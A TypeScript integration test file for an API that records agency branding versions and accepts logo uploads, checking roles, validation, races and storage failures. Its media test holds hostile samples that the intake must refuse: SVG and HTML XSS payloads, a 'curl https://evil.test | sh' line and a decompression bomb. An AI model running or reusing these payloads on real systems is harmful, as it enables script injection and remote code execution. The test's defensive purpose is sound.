// CMD008 UpdateBranding — POST /api/v1/agencies/{agencyId}/branding — AGENCY_OWNER_OR_ADMIN, and the logo intake its logoArtifactRef
// names — POST /api/v1/agencies/{agencyId}/branding/logos (registry cases CMD008-OK / -DENY / -RACE; order 7, docs/design/B13-branding.md).
// The api over a real PostgreSQL 17: every image is synthetic, written here byte by byte; nothing is fetched from anywhere.
import assert from "node:assert/strict";
import { createHash } from "node:crypto";
import { after, before, test } from "node:test";
import { crc32, deflateSync } from "node:zlib";
import type { BrandingLogoIntakeView, UpdateBrandingView } from "@kauro/application";
import { decodeAdmittedPng, encodePng } from "@kauro/domain";
import { recordSeller } from "./sales-support.js";
import { SimulatedCrash, asProblem, call, completed, freshKey, outcome, replayTextOf, rootCause, waitForApiLockWait, world, type Person, type Reply, type World } from "./support.js";
import { activePerson, agencyVersion, refusalOf, suspendMember } from "./team-support.js";

let w: World;
before(async () => {
  w = await world();
});
after(async () => {
  await w.stop();
});

const brandingUrl = (agencyId: string): string => `/api/v1/agencies/${agencyId}/branding`;
const logosUrl = (agencyId: string): string => `/api/v1/agencies/${agencyId}/branding/logos`;

/** A synthetic RGBA gradient (the seed in its blue channel), written by the platform's own encoder: a valid PNG. */
function gradientPng(seed: number, width = 32, height = 16): Buffer {
  const px = new Uint8Array(width * height * 4);
  for (let y = 0; y < height; y++) for (let x = 0; x < width; x++) px.set([(x * 8) & 0xff, (y * 16) & 0xff, seed & 0xff, 255], (y * width + x) * 4);
  return Buffer.from(encodePng(width, height, px));
}

function chunk(type: string, data: Uint8Array, badCrc = false): Buffer {
  const out = Buffer.alloc(12 + data.length);
  out.writeUInt32BE(data.length, 0);
  out.write(type, 4, "latin1");
  out.set(data, 8);
  out.writeUInt32BE((crc32(out.subarray(4, 8 + data.length)) ^ (badCrc ? 1 : 0)) >>> 0, 8 + data.length);
  return out;
}
const SIGNATURE = Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]);
const ihdr = (width: number, height: number): Buffer => {
  const b = Buffer.alloc(13);
  b.writeUInt32BE(width, 0);
  b.writeUInt32BE(height, 4);
  b[8] = 8;
  b[9] = 6;
  return b;
};
const sha256 = (bytes: Uint8Array): string => createHash("sha256").update(bytes).digest("hex");
const document = (bytes: Uint8Array, overrides: Record<string, unknown> = {}) => ({ mediaType: "image/png", contentBase64: Buffer.from(bytes).toString("base64"), contentSha256: sha256(bytes), rightsConfirmed: true, ...overrides });

function upload(bytes: Uint8Array, options: { readonly person?: Person; readonly agencyId?: string; readonly agency?: string | null; readonly body?: unknown } = {}): Promise<Reply> {
  return call(w, { url: logosUrl(options.agencyId ?? w.A.agencyId), token: (options.person ?? w.owner).token, key: null, agency: options.agency === undefined ? w.A.agencyId : options.agency, body: options.body ?? document(bytes) });
}
function stored(reply: Reply, status: 200 | 201): BrandingLogoIntakeView {
  assert.equal(reply.status, status, reply.text);
  const body = reply.json<{ kind: string; data: BrandingLogoIntakeView }>();
  assert.equal(body.kind, "STORED");
  return body.data;
}
function brand(body: Record<string, unknown>, options: { readonly person?: Person; readonly key?: string; readonly agencyId?: string } = {}): Promise<Reply> {
  return call(w, { url: brandingUrl(options.agencyId ?? w.A.agencyId), token: (options.person ?? w.owner).token, key: options.key ?? freshKey("cmd008"), body });
}

/** What CMD008 and the intake can write: the "no committed state" oracle. */
async function snapshot(): Promise<Readonly<Record<string, number>>> {
  return {
    versions: await w.count("agency_branding_versions"),
    logos: await w.count("agency_branding_logos"),
    agencyVersion: await agencyVersion(w),
    events: await w.count("domain_events", "aggregate_kind = 'agency' AND event_type = 'agency.branding_versioned.v1'"),
    journal: await w.count("command_journal", "operation = 'CMD008'"),
  };
}

let ownerLogo: BrandingLogoIntakeView;

test("CMD008-OK: the OWNER stores a logo through the safe media pipeline (once per image), records a branding version naming it and an ADMIN records the next without a logo; each version is immutable, numbered in order, moves the agency's version by one with its event, and is journaled", async () => {
  const upload1 = gradientPng(1);
  const first = stored(await upload(upload1), 201);
  assert.equal(first.created, true);
  assert.deepEqual([first.agencyId, first.mediaType, first.width, first.height], [w.A.agencyId, "image/png", 32, 16]);
  // the stored bytes are the platform's own PNG of the upload's pixels, named by their SHA-256
  const row = await w.row<{ content: Buffer; logo_sha256: string; recorded_by_membership_id: string }>("agency_branding_logos", "logo_id = $1", [first.logoId]);
  assert.ok(row);
  assert.equal(sha256(row.content), first.sha256);
  assert.equal(row.logo_sha256, first.sha256);
  assert.equal(row.recorded_by_membership_id, w.memberships.owner);
  assert.deepEqual(decodeAdmittedPng(row.content).rgba, decodeAdmittedPng(upload1).rgba, "the pixels are the upload's");
  // the same image again: the logo already stored, nothing new
  const again = stored(await upload(upload1), 200);
  assert.deepEqual([again.created, again.logoId, again.sha256], [false, first.logoId, first.sha256]);
  ownerLogo = first;

  const before = await agencyVersion(w);
  const key = freshKey("cmd008-ok");
  const reply = await brand({ expectedVersion: before, displayName: "Acme Data Partners", logoArtifactRef: first.logoId }, { key });
  const done = completed<UpdateBrandingView>(reply, 201);
  assert.equal(done.replayed, false);
  assert.equal(done.version, before + 1);
  assert.equal(done.data.agency.version, before + 1);
  assert.deepEqual([done.data.branding.agencyId, done.data.branding.brandingVersion, done.data.branding.displayName], [w.A.agencyId, 1, "Acme Data Partners"]);
  assert.deepEqual(done.data.branding.logo, { logoId: first.logoId, sha256: first.sha256, mediaType: "image/png", width: 32, height: 16, byteLength: first.byteLength });
  const v1 = await w.row<{ branding_version: number; display_name: string; logo_id: string; recorded_by_membership_id: string }>("agency_branding_versions", "agency_id = $1 AND branding_version = 1", [w.A.agencyId]);
  assert.deepEqual(v1 && [v1.display_name, v1.logo_id, v1.recorded_by_membership_id], ["Acme Data Partners", first.logoId, w.memberships.owner]);
  const events = await w.events("agency", w.A.agencyId);
  assert.deepEqual(events.at(-1) && [events.at(-1)!.version, events.at(-1)!.type], [before + 1, "agency.branding_versioned.v1"]);
  const journal = await w.journal(key);
  assert.deepEqual(journal && { state: journal.state, status: journal.status, kind: journal.resourceKind, id: journal.resourceId }, { state: "COMMITTED", status: 201, kind: "agency", id: w.A.agencyId });

  // an ADMIN records the next version, naming no logo: the earlier version is untouched
  const v1Before = await w.row("agency_branding_versions", "agency_id = $1 AND branding_version = 1", [w.A.agencyId]);
  const byAdmin = completed<UpdateBrandingView>(await brand({ expectedVersion: before + 1, displayName: "Acme Data Partners Ltd" }, { person: w.admin }), 201);
  assert.deepEqual([byAdmin.data.branding.brandingVersion, byAdmin.data.branding.logo, byAdmin.data.agency.version], [2, undefined, before + 2]);
  assert.equal(JSON.stringify(byAdmin.data).includes('"logo"'), false, "a version naming no logo carries no logo member");
  assert.deepEqual(await w.row("agency_branding_versions", "agency_id = $1 AND branding_version = 1", [w.A.agencyId]), v1Before, "a new version never edits an earlier one");
  // an ADMIN stores a logo too
  assert.equal(stored(await upload(gradientPng(2), { person: w.admin }), 201).created, true);
});

test("CMD008-DENY roles and tenants: an OPERATOR, APPROVER, VIEWER or BILLING member, a suspended ADMIN, an unverified identity, the owner of another agency, an active seller and the corporate owner change nothing — on the command and on the logo intake alike", async () => {
  const sw = { owner: await w.person("cmd008-corporate-owner") };
  await w.h.grantKauroOwner(sw.owner.userId);
  const seller = await recordSeller(w, sw.owner.userId, "cmd008-seller");
  const suspendedAdmin = await activePerson(w, "cmd008-suspended-admin", "ADMIN");
  await suspendMember(w, suspendedAdmin.membershipId);
  const before = await snapshot();
  const denialsBefore = (await w.securityEvents("CMD008")).length;
  const body = async () => ({ expectedVersion: await agencyVersion(w), displayName: "Not Mine", logoArtifactRef: ownerLogo.logoId });
  const image = gradientPng(30);
  for (const p of [w.operator, w.approver, w.viewer, w.billing]) {
    assert.equal(refusalOf(w, await brand(await body(), { person: p })), "403 NOT_AUTHORIZED ROLE_INSUFFICIENT");
    assert.equal(refusalOf(w, await upload(image, { person: p })), "403 NOT_AUTHORIZED ROLE_INSUFFICIENT");
  }
  assert.equal(refusalOf(w, await brand(await body(), { person: suspendedAdmin.person })), "403 NOT_AUTHORIZED MEMBERSHIP_SUSPENDED");
  assert.equal(refusalOf(w, await upload(image, { person: suspendedAdmin.person })), "403 NOT_AUTHORIZED MEMBERSHIP_SUSPENDED");
  assert.equal(refusalOf(w, await brand(await body(), { person: w.unverified })), "403 NOT_AUTHORIZED IDENTITY_UNVERIFIED");
  // another agency's owner: A's path answers as a nonexistent agency, under either selector
  assert.equal(refusalOf(w, await brand(await body(), { person: w.stranger })), "404 NOT_FOUND NOT_A_MEMBER");
  assert.equal(refusalOf(w, await upload(image, { person: w.stranger })), "404 NOT_FOUND NOT_A_MEMBER");
  assert.equal(refusalOf(w, await upload(image, { person: w.stranger, agency: w.B.agencyId })), "404 NOT_FOUND -", "B's owner naming A's path under B's selector");
  // a seller of Kauro and Kauro's corporate owner are not members of the agency
  for (const p of [seller.person, sw.owner]) {
    assert.equal(refusalOf(w, await brand(await body(), { person: p })), "404 NOT_FOUND NOT_A_MEMBER");
    assert.equal(refusalOf(w, await upload(image, { person: p })), "404 NOT_FOUND NOT_A_MEMBER");
  }
  assert.deepEqual(await snapshot(), before, "no version, logo, agency version, event or journal entry from any refusal");
  const denials = (await w.securityEvents("CMD008")).slice(denialsBefore);
  assert.ok(denials.length >= 8 && denials.every((d) => d.outcome === "DENY"), "each command refusal is a durable denial");
});

test("CMD008-DENY preconditions: a stale version, a name a report could not print, a logo the agency did not store (another agency's included) and an extra member are refused with nothing recorded", async () => {
  const theirs = stored(await upload(gradientPng(40), { person: w.stranger, agencyId: w.B.agencyId, agency: w.B.agencyId }), 201);
  const before = await snapshot();
  const current = await agencyVersion(w);
  const stale = await brand({ expectedVersion: current - 1, displayName: "Rewriting The Past" });
  assert.equal(outcome(w, stale), "409 STALE_VERSION -", "an earlier version cannot be rewritten or recorded again");
  assert.equal(asProblem(w, stale).current?.version, current);
  for (const name of ["<b>Bold</b>", "Smith & Co", "Quote \"Me\"", "It's", "Hidden​Space", "Bidi‮Txet", " Padded", "Padded ", "x".repeat(121), "Café"]) {
    assert.equal(refusalOf(w, await brand({ expectedVersion: current, displayName: name })), "400 INVALID_REQUEST BRANDING_NAME_UNPRINTABLE", JSON.stringify(name));
  }
  assert.equal(refusalOf(w, await brand({ expectedVersion: current, displayName: "Line\nBreak" })), "400 INVALID_REQUEST SCHEMA_VIOLATION", "a control character is refused by the schema");
  // another agency's logo, and an id no logo has, are one answer: not a logo of this agency
  for (const ref of [theirs.logoId, "01960000-0000-7000-8000-000000000000"]) {
    const refused = await brand({ expectedVersion: current, displayName: "Borrowed Logo", logoArtifactRef: ref });
    assert.equal(outcome(w, refused), "400 INVALID_REQUEST UNKNOWN_REFERENCE");
    assert.deepEqual(asProblem(w, refused).errors, [{ field: "logoArtifactRef", code: "UNKNOWN_REFERENCE" }]);
  }
  for (const extra of [{ logoUrl: "https://cdn.example.test/logo.png" }, { brandingVersion: 9 }, { logoArtifactRef: "https://cdn.example.test/logo.png" }]) {
    assert.equal(refusalOf(w, await brand({ expectedVersion: current, displayName: "Extra", ...extra })), "400 INVALID_REQUEST SCHEMA_VIOLATION", JSON.stringify(extra));
  }
  assert.deepEqual(await snapshot(), before, "nothing recorded");
});

test("CMD008-DENY media: SVG, script, JPEG, forged or broken PNGs, image bombs, oversized images, a hash or encoding that is not the bytes', a URL instead of bytes and a declared format other than PNG are refused by the logo intake — nothing stored, nothing fetched", async () => {
  const fetched: string[] = [];
  const realFetch = globalThis.fetch;
  globalThis.fetch = ((input: unknown) => {
    fetched.push(String(input));
    return Promise.reject(new Error("no fetch from the logo intake"));
  }) as typeof fetch;
  try {
    const before = await snapshot();
    const good = gradientPng(50);
    const idat = chunk("IDAT", deflateSync(Buffer.alloc(17 * 4 + 4)));
    const media: ReadonlyArray<readonly [string, Buffer, string]> = [
      ["svg", Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><image href="https://evil.test/x.png"/><script>fetch("https://evil.test")</script></svg>'), "LOGO_FORMAT_UNSUPPORTED"],
      ["html", Buffer.from("<!doctype html><img src=x onerror=alert(1)>"), "LOGO_FORMAT_UNSUPPORTED"],
      ["script", Buffer.from("#!/bin/sh\ncurl https://evil.test | sh\n"), "LOGO_FORMAT_UNSUPPORTED"],
      ["jpeg", Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 16, 0x4a, 0x46, 0x49, 0x46, 0, 1, 1, 0, 0, 1, 0, 1, 0, 0, 0xff, 0xd9]), "LOGO_FORMAT_UNSUPPORTED"],
      ["svg renamed .png behind a PNG signature", Buffer.concat([SIGNATURE, Buffer.from("<svg/>")]), "LOGO_MALFORMED"],
      ["animated png", Buffer.concat([SIGNATURE, chunk("IHDR", ihdr(4, 4)), chunk("acTL", Buffer.alloc(8)), idat, chunk("IEND", new Uint8Array(0))]), "LOGO_FORMAT_UNSUPPORTED"],
      ["bad CRC", Buffer.concat([SIGNATURE, chunk("IHDR", ihdr(4, 4), true), idat, chunk("IEND", new Uint8Array(0))]), "LOGO_MALFORMED"],
      ["bytes after IEND", Buffer.concat([good, Buffer.from("<script>alert(1)</script>")]), "LOGO_MALFORMED"],
      ["truncated", good.subarray(0, good.length - 9), "LOGO_MALFORMED"],
      ["decompression bomb", Buffer.concat([SIGNATURE, chunk("IHDR", ihdr(1, 1)), chunk("IDAT", deflateSync(Buffer.alloc(64 * 1024 * 1024), { level: 9 })), chunk("IEND", new Uint8Array(0))]), "LOGO_MALFORMED"],
      ["more than 2048 pixels a side", Buffer.concat([SIGNATURE, chunk("IHDR", ihdr(4096, 1)), idat, chunk("IEND", new Uint8Array(0))]), "LOGO_DIMENSIONS_OUT_OF_RANGE"],
    ];
    for (const [label, bytes, reason] of media) assert.equal(refusalOf(w, await upload(bytes)), `400 INVALID_REQUEST ${reason}`, label);
    // the uploader's hash must be the bytes'; the base64 must be the one spelling of them
    assert.equal(refusalOf(w, await upload(good, { body: document(good, { contentSha256: sha256(gradientPng(51)) }) })), "400 INVALID_REQUEST LOGO_DIGEST_MISMATCH");
    const padded = Buffer.from(good).toString("base64").replace(/=*$/, "");
    if (padded !== Buffer.from(good).toString("base64")) assert.equal(refusalOf(w, await upload(good, { body: document(good, { contentBase64: padded }) })), "400 INVALID_REQUEST LOGO_DIGEST_MISMATCH", "unpadded base64 is another spelling");
    // the closed document: no URL, no other format, no rights left unconfirmed, nothing larger than the bound
    for (const [label, body] of [
      ["a URL instead of bytes", document(good, { contentBase64: "https://cdn.example.test/logo.png" })],
      ["an extra url member", { ...document(good), url: "https://cdn.example.test/logo.png" }],
      ["SVG declared", document(good, { mediaType: "image/svg+xml" })],
      ["JPEG declared", document(good, { mediaType: "image/jpeg" })],
      ["rights not confirmed", document(good, { rightsConfirmed: false })],
    ] as const) assert.equal(refusalOf(w, await upload(good, { body })), "400 INVALID_REQUEST SCHEMA_VIOLATION", label);
    const big = Buffer.alloc(512 * 1024 + 3, 7);
    assert.match(refusalOf(w, await upload(big, { body: document(big) })), /^400 INVALID_REQUEST (JSON_STRING_TOO_LONG|SCHEMA_VIOLATION|BODY_TOO_LARGE)$/, "more than 512 KiB");
    assert.deepEqual(await snapshot(), before, "nothing stored");
    assert.deepEqual(fetched, [], "nothing was fetched");
  } finally {
    globalThis.fetch = realFetch;
  }
});

test("CMD008-RACE: two branding changes naming one agency version — one records, the other is STALE with nothing written; an identical retry replays without a new version; the same key with another body conflicts; a crash before COMMIT leaves nothing and the key runs again; a response lost after COMMIT is recovered from the journal", async () => {
  const current = await agencyVersion(w);
  const versionsBefore = await w.count("agency_branding_versions", "agency_id = $1", [w.A.agencyId]);
  const keyA = freshKey("cmd008-race-a");
  const keyB = freshKey("cmd008-race-b");
  const hold = w.holds.arm("journal.commit");
  const requestA = brand({ expectedVersion: current, displayName: "Race Winner", logoArtifactRef: ownerLogo.logoId }, { key: keyA });
  await hold.reached;
  const requestB = brand({ expectedVersion: current, displayName: "Race Loser" }, { person: w.admin, key: keyB });
  try {
    await waitForApiLockWait(w, "FOR NO KEY UPDATE");
  } finally {
    hold.release();
  }
  const [a, b] = await Promise.all([requestA, requestB]);
  const win = completed<UpdateBrandingView>(a, 201);
  assert.equal(outcome(w, b), "409 STALE_VERSION -", b.text);
  assert.equal(asProblem(w, b).current?.version, current + 1);
  assert.equal(await w.count("agency_branding_versions", "agency_id = $1", [w.A.agencyId]), versionsBefore + 1, "one version for one agency version");
  assert.equal(await w.count("agency_branding_versions", "agency_id = $1 AND display_name = 'Race Loser'", [w.A.agencyId]), 0);
  assert.equal(await w.journal(keyB), null);

  // identical retry: the journaled 201, no second version
  const replay = await brand({ expectedVersion: current, displayName: "Race Winner", logoArtifactRef: ownerLogo.logoId }, { key: keyA });
  assert.equal(replay.status, 201);
  assert.equal(replay.text, replayTextOf(a));
  assert.equal(completed<UpdateBrandingView>(replay, 201).replayed, true);
  assert.equal(await w.count("agency_branding_versions", "agency_id = $1", [w.A.agencyId]), versionsBefore + 1);
  assert.equal(outcome(w, await brand({ expectedVersion: current, displayName: "Another Name" }, { key: keyA })), "409 IDEMPOTENCY_CONFLICT REQUEST_DIGEST_DIFFERS");

  // crash before COMMIT: no version, no agency version, no event, no journal; the same key is then a first execution
  const crashKey = freshKey("cmd008-crash");
  const crashBody = { expectedVersion: current + 1, displayName: "Crash Before Commit" };
  const before = await snapshot();
  w.holds.arm("journal.commit", { fail: new SimulatedCrash("before COMMIT") });
  assert.equal(outcome(w, await brand(crashBody, { key: crashKey })), "500 INTERNAL_ERROR -");
  assert.equal(rootCause(w.internalErrors.at(-1)?.error) instanceof SimulatedCrash, true);
  assert.deepEqual(await snapshot(), before, "nothing of the crashed execution is durable");
  assert.equal(await w.journal(crashKey), null);
  const retried = completed<UpdateBrandingView>(await brand(crashBody, { key: crashKey }), 201);
  assert.deepEqual([retried.replayed, retried.data.branding.brandingVersion, retried.data.branding.displayName], [false, win.data.branding.brandingVersion + 1, "Crash Before Commit"]);

  // response lost after COMMIT: durable once; the retry answers the journaled result and records nothing more
  const lostKey = freshKey("cmd008-lost");
  const lostBody = { expectedVersion: current + 2, displayName: "Lost Response" };
  w.holds.arm("after.commit", { fail: new SimulatedCrash("response lost after COMMIT") });
  assert.equal(outcome(w, await brand(lostBody, { key: lostKey })), "500 INTERNAL_ERROR -");
  const afterLoss = await snapshot();
  assert.equal(afterLoss["agencyVersion"], current + 3);
  const recovered = completed<UpdateBrandingView>(await brand(lostBody, { key: lostKey }), 201);
  assert.deepEqual([recovered.replayed, recovered.data.branding.displayName, recovered.data.agency.version], [true, "Lost Response", current + 3]);
  assert.deepEqual(await snapshot(), afterLoss, "the recovery recorded nothing more");
  assert.equal(await w.count("agency_branding_versions", "agency_id = $1 AND display_name = 'Lost Response'", [w.A.agencyId]), 1);
});

test("CMD008-RACE storage: a storage failure while the logo or the version is written leaves nothing partial — no logo, no version, no agency version, no event, no journal entry — and the same request then succeeds once", async () => {
  const o = w.h.oracle;
  const fault = async (table: string, on: boolean): Promise<void> => {
    if (on) {
      await o.query(`CREATE OR REPLACE FUNCTION kauro.test_storage_fault() RETURNS trigger LANGUAGE plpgsql AS $f$ BEGIN RAISE EXCEPTION 'simulated storage failure' USING ERRCODE = '58030'; END $f$`);
      await o.query(`CREATE TRIGGER test_storage_fault BEFORE INSERT ON kauro.${table} FOR EACH ROW EXECUTE FUNCTION kauro.test_storage_fault()`);
    } else {
      await o.query(`DROP TRIGGER IF EXISTS test_storage_fault ON kauro.${table}`);
      await o.query("DROP FUNCTION IF EXISTS kauro.test_storage_fault()");
    }
  };
  const image = gradientPng(60);
  const before = await snapshot();
  await fault("agency_branding_logos", true);
  try {
    const failed = await upload(image);
    assert.ok(failed.status >= 500, failed.text);
  } finally {
    await fault("agency_branding_logos", false);
  }
  assert.deepEqual(await snapshot(), before, "no logo");
  const logo = stored(await upload(image), 201);

  const key = freshKey("cmd008-storage");
  const body = { expectedVersion: await agencyVersion(w), displayName: "After A Storage Failure", logoArtifactRef: logo.logoId };
  const beforeVersion = await snapshot();
  await fault("agency_branding_versions", true);
  try {
    const failed = await brand(body, { key });
    assert.ok(failed.status >= 500, failed.text);
  } finally {
    await fault("agency_branding_versions", false);
  }
  assert.deepEqual(await snapshot(), beforeVersion, "no version, agency version, event or journal entry");
  assert.equal(await w.journal(key), null);
  const done = completed<UpdateBrandingView>(await brand(body, { key }), 201);
  assert.equal(done.replayed, false);
  assert.equal(await w.count("agency_branding_versions", "agency_id = $1 AND display_name = 'After A Storage Failure'", [w.A.agencyId]), 1);
});

test("CMD008 isolation: agency B's branding is its own — numbered from 1, its logo invisible to A, A's versions invisible to B's owner — and a CLOSING agency records nothing", async () => {
  const bVersion = await agencyVersion(w, w.B.agencyId);
  const bLogo = stored(await upload(gradientPng(70), { person: w.stranger, agencyId: w.B.agencyId, agency: w.B.agencyId }), 201);
  const bDone = completed<UpdateBrandingView>(await brand({ expectedVersion: bVersion, displayName: "Bravo Studio", logoArtifactRef: bLogo.logoId }, { person: w.stranger, agencyId: w.B.agencyId }), 201);
  assert.equal(bDone.data.branding.brandingVersion, 1, "numbered per agency");
  // A's owner cannot name B's logo, and B's owner reads none of A's versions or logos
  assert.equal(refusalOf(w, await brand({ expectedVersion: await agencyVersion(w), displayName: "Cross", logoArtifactRef: bLogo.logoId })), "400 INVALID_REQUEST UNKNOWN_REFERENCE");
  const asB = await w.h.pg.connect("kauro_app_test");
  try {
    await asB.query("BEGIN");
    await asB.query("SELECT set_config('kauro.agency_id', $1, true), set_config('kauro.user_id', $2, true)", [w.B.agencyId, w.stranger.userId]);
    assert.equal((await asB.query("SELECT 1 FROM kauro.agency_branding_versions WHERE agency_id = $1", [w.A.agencyId])).rowCount, 0);
    assert.equal((await asB.query("SELECT 1 FROM kauro.agency_branding_logos WHERE agency_id = $1", [w.A.agencyId])).rowCount, 0);
    await asB.query("ROLLBACK");
  } finally {
    await asB.end();
  }
  // a CLOSING agency (as CMD043 leaves one; written here by the superuser with the triggers off) stores no logo and records no branding
  const closer = await w.person("cmd008-closing-owner");
  const C = await w.h.createAgency(closer.userId, "Closing Agency");
  const o = w.h.oracle;
  await o.query("BEGIN");
  await o.query("SET LOCAL session_replication_role = replica");
  await o.query("UPDATE kauro.agencies SET state = 'CLOSING' WHERE agency_id = $1", [C.agencyId]);
  await o.query("COMMIT");
  const closing = await brand({ expectedVersion: await agencyVersion(w, C.agencyId), displayName: "Too Late" }, { person: closer, agencyId: C.agencyId });
  assert.equal(outcome(w, closing), "409 PRECONDITION_FAILED AGENCY_NOT_OPEN");
  assert.equal(refusalOf(w, await upload(gradientPng(71), { person: closer, agencyId: C.agencyId, agency: C.agencyId })), "409 PRECONDITION_FAILED AGENCY_NOT_OPEN");
  assert.equal(await w.count("agency_branding_versions", "agency_id = $1", [C.agencyId]), 0);
  assert.equal(await w.count("agency_branding_logos", "agency_id = $1", [C.agencyId]), 0);
});
